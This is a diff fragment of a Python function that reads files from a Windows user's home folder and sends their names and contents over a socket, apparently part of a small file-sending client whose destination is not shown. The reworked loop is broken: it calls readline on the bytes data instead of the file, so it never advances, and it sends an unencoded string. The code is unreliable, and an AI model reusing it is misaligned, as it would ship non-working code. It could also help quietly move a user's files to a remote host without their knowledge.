@@ -75,14 +75,17 @@ def sendFiles(filedir: str):
                 msg = f"FILENAME:{filename}"
                 suck.send(msg.encode("utf-8")) # FILENAME:{filename}
 
-                dict_files = open("C:\\Users\\" + getuser()[0] + "\\" + filedir + "\\" + filename, "r")
+                dict_files = open("C:\\Users\\" + getuser()[0] + "\\" + filedir + "\\" + filename, "rb")
                 print("Got file dir: ", dict_files.name)
                 time.sleep(0.2)
                 
-                file_data = dict_files.read()
-                msg = f"DATA:{file_data}"
-                suck.send(msg.encode("utf-8"))
-                msg = ""
+                file_data = dict_files.readline(1024)
+                while(file_data):
+                    msg = f"DATA:{file_data}"
+                    print(msg)
+                    suck.send(msg)
+                    msg = ""
+                    file_data.readline(1024)
                 
                 time.sleep(0.2)
                 msg = f"FINISH:Completed"
